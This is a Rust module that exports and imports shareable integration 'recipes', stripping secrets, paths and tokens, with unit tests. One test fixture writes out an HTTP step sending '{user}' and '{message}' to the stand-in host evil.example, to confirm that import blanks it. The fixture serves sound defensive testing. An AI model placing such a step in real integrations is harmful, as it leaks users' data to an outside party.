//! Recipes: integrations shared as a line of text (`ic-recipe:1:...`).
//!
//! A recipe is data, never code, and carries nothing private:
//! - Discord connections are replaced by a placeholder; the importer picks
//!   one of their own connections for it.
//! - Web call links get new secret tokens on import.
//! - Hotkeys and MIDI pads are left for the importer to pick: a pad names
//!   the sharer's controller, and their keys may be taken on another PC.
//! - Everything imported arrives switched off.
//! - Steps that run programs or write files are flagged, and the import
//!   needs an explicit yes for them.
//!
//! Import cleans exactly what export does, so a recipe written by hand
//! can't bring in a web address, a program or a hotkey the user never set.

use super::model::{visit_steps, Integration, StepKind, Trigger};
use crate::json::{self, Value};

const PREFIX: &str = "ic-recipe:1:";
/// Placeholder a shared Discord step points at until the importer maps it.
pub const DISCORD_PLACEHOLDER: &str = "@discord";
const MAX_RECIPE_LEN: usize = 256 * 1024;
const MAX_RECIPE_INTEGRATIONS: usize = 20;

pub struct Recipe {
    pub name: String,
    pub integrations: Vec<Integration>,
}

impl Recipe {
    pub fn uses_discord(&self) -> bool {
        self.integrations.iter().any(|i| {
            let mut found = false;
            for h in &i.handlers {
                visit_steps(&h.steps, &mut |s| found |= s.kind == StepKind::Discord);
            }
            found
        })
    }

    pub fn has_local_effects(&self) -> bool {
        self.integrations.iter().any(Integration::has_local_effects)
    }
}

pub fn export(name: &str, integrations: &[Integration]) -> String {
    let cleaned: Vec<Value> = integrations
        .iter()
        .map(|i| {
            let mut i = i.clone();
            make_private(&mut i);
            i.to_json()
        })
        .collect();
    let doc = json::obj([
        ("name", json::str(name)),
        ("integrations", Value::Arr(cleaned)),
    ]);
    format!("{PREFIX}{}", base64url_encode(doc.to_json().as_bytes()))
}

/// Blank whatever a recipe must never carry: see `strip_private`, plus web
/// call tokens and the hotkey or pad an integration starts from.
fn make_private(i: &mut Integration) {
    for h in &mut i.handlers {
        strip_private(&mut h.steps);
        match &mut h.trigger {
            Trigger::Webhook { token } => token.clear(),
            Trigger::Shortcut { hotkey, midi } => {
                hotkey.clear();
                midi.clear();
            }
            _ => {}
        }
    }
}

/// The Discord connection, web requests (address, headers and body hold
/// API keys and webhook secrets), and programs and files (their paths and
/// arguments name the user's folders and carry tokens).
fn strip_private(steps: &mut [super::model::Step]) {
    for s in steps {
        match s.kind {
            StepKind::Discord => {
                s.params
                    .insert("connection".into(), DISCORD_PLACEHOLDER.into());
            }
            StepKind::Http => {
                s.params.insert("url".into(), String::new());
                s.params.remove("headers");
                s.params.remove("body");
            }
            StepKind::Program => {
                s.params.insert("path".into(), String::new());
                s.params.remove("args");
            }
            StepKind::File => {
                s.params.insert("path".into(), String::new());
            }
            _ => {}
        }
        strip_private(&mut s.then);
        strip_private(&mut s.otherwise);
    }
}

/// Parse a pasted recipe. `new_id` makes fresh ids so an import never
/// overwrites what the user already has.
pub fn parse(text: &str, mut new_id: impl FnMut() -> String) -> Result<Recipe, String> {
    let text = text.trim();
    if text.len() > MAX_RECIPE_LEN {
        return Err("that recipe is too big".to_string());
    }
    let encoded = text
        .strip_prefix(PREFIX)
        .ok_or("that is not an InstantClone recipe (it should start with ic-recipe:1:)")?;
    let bytes = base64url_decode(encoded).ok_or("the recipe is damaged; copy it again")?;
    let doc = std::str::from_utf8(&bytes)
        .ok()
        .and_then(|t| json::parse(t).ok())
        .ok_or("the recipe is damaged; copy it again")?;
    let list = doc
        .get("integrations")
        .and_then(Value::as_array)
        .unwrap_or(&[]);
    if list.is_empty() || list.len() > MAX_RECIPE_INTEGRATIONS {
        return Err("the recipe has no integrations, or too many".to_string());
    }
    let mut integrations = Vec::new();
    for v in list {
        let mut i = Integration::from_json(v)?;
        if let Some(problem) = i.problems().invalid.first() {
            return Err(format!(
                "the recipe has something unsafe or broken: {problem}"
            ));
        }
        make_private(&mut i);
        i.id = new_id();
        i.enabled = false;
        for h in &mut i.handlers {
            if let Trigger::Webhook { token } = &mut h.trigger {
                *token = new_id() + &new_id();
            }
        }
        integrations.push(i);
    }
    Ok(Recipe {
        name: doc
            .str_or("name", "Shared recipe")
            .chars()
            .take(80)
            .collect(),
        integrations,
    })
}

/// Point every placeholder Discord step at `channel`.
pub fn map_discord(recipe: &mut Recipe, channel: &str) {
    for i in &mut recipe.integrations {
        for h in &mut i.handlers {
            map_steps(&mut h.steps, channel);
        }
    }
}

fn map_steps(steps: &mut [super::model::Step], channel: &str) {
    for s in steps {
        if s.kind == StepKind::Discord && s.param("connection") == DISCORD_PLACEHOLDER {
            s.params.insert("connection".into(), channel.to_string());
        }
        map_steps(&mut s.then, channel);
        map_steps(&mut s.otherwise, channel);
    }
}

const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

fn base64url_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let n = chunk.iter().fold(0u32, |acc, b| (acc << 8) | *b as u32) << (8 * (3 - chunk.len()));
        for i in 0..=chunk.len() {
            out.push(ALPHABET[((n >> (18 - 6 * i)) & 63) as usize] as char);
        }
    }
    out
}

fn base64url_decode(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(text.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0;
    for c in text
        .bytes()
        .filter(|c| !c.is_ascii_whitespace() && *c != b'=')
    {
        let v = ALPHABET.iter().position(|a| *a == c)? as u32;
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::super::presets;
    use super::*;

    #[test]
    fn base64_round_trips_every_length() {
        for len in 0..40 {
            let data: Vec<u8> = (0..len).map(|i| (i * 37 + 11) as u8).collect();
            assert_eq!(base64url_decode(&base64url_encode(&data)).unwrap(), data);
        }
        assert!(base64url_decode("abc*").is_none());
    }

    #[test]
    fn export_hides_connections_and_import_starts_off() {
        let alert = presets::build("crash_alert", "a1".into(), "my-private-channel").unwrap();
        let text = export("Crash kit", &[alert]);
        assert!(text.starts_with(PREFIX));
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("my-private-channel"));

        let mut n = 0;
        let mut recipe = parse(&text, || {
            n += 1;
            format!("new{n}")
        })
        .unwrap();
        assert_eq!(recipe.name, "Crash kit");
        assert!(recipe.uses_discord());
        let imported = &recipe.integrations[0];
        assert_eq!(imported.id, "new1");
        assert!(!imported.enabled);

        map_discord(&mut recipe, "mine");
        assert_eq!(
            recipe.integrations[0].handlers[0].steps[0].param("connection"),
            "mine"
        );
    }

    #[test]
    fn addresses_headers_and_paths_are_never_shared() {
        use super::super::model::Step;
        let mut i = presets::build("webhook", "w".into(), "").unwrap();
        i.handlers[0].steps = vec![
            Step::new(
                StepKind::Http,
                &[
                    ("url", "https://api.example/secret-key"),
                    ("headers", "Authorization: Bearer s3cret"),
                ],
            ),
            Step::new(
                StepKind::File,
                &[("path", r"C:\Users\oriol\stream.txt"), ("text", "x")],
            ),
        ];
        let text = export("x", &[i]);
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        for secret in ["secret-key", "s3cret", "oriol"] {
            assert!(!decoded.contains(secret), "{secret} leaked");
        }
    }

    #[test]
    fn web_call_tokens_are_never_shared() {
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Webhook {
            token: "secret-token-1234567890".into(),
        };
        let text = export("x", &[i]);
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("secret-token"));
        let recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
        match &recipe.integrations[0].handlers[0].trigger {
            Trigger::Webhook { token } => assert!(token.starts_with("fresh")),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn shortcuts_are_left_for_the_importer() {
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Shortcut {
            hotkey: "Ctrl+Alt+K".into(),
            midi: "note:1:36@Oriol's Launchpad".into(),
        };
        let text = export("x", &[i]);
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("Launchpad") && !decoded.contains("Ctrl+Alt+K"));
        assert!(
            parse(&text, || "fresh1234567890ab".into()).is_ok(),
            "still imports, unfinished"
        );
    }

    #[test]
    fn a_hand_written_recipe_is_cleaned_on_import() {
        use super::super::model::Step;
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Shortcut {
            hotkey: "Ctrl+C".into(),
            midi: String::new(),
        };
        i.handlers[0].steps = vec![Step::new(
            StepKind::Http,
            &[
                ("url", "https://evil.example/?u={user}"),
                ("body", "{message}"),
            ],
        )];
        // Encoded by hand, skipping the cleaning `export` does.
        let doc = json::obj([("integrations", Value::Arr(vec![i.to_json()]))]);
        let text = format!("{PREFIX}{}", base64url_encode(doc.to_json().as_bytes()));
        let recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
        let h = &recipe.integrations[0].handlers[0];
        assert_eq!(h.steps[0].param("url"), "");
        assert_eq!(h.steps[0].param("body"), "");
        assert!(matches!(&h.trigger, Trigger::Shortcut { hotkey, .. } if hotkey.is_empty()));
    }

    #[test]
    fn junk_is_refused_politely() {
        assert!(parse("hello", || "x".into()).is_err());
        assert!(parse("ic-recipe:1:!!!", || "x".into()).is_err());
        assert!(
            parse(&format!("{PREFIX}{}", base64url_encode(b"{}")), || "x"
                .into())
            .is_err()
        );
    }
}
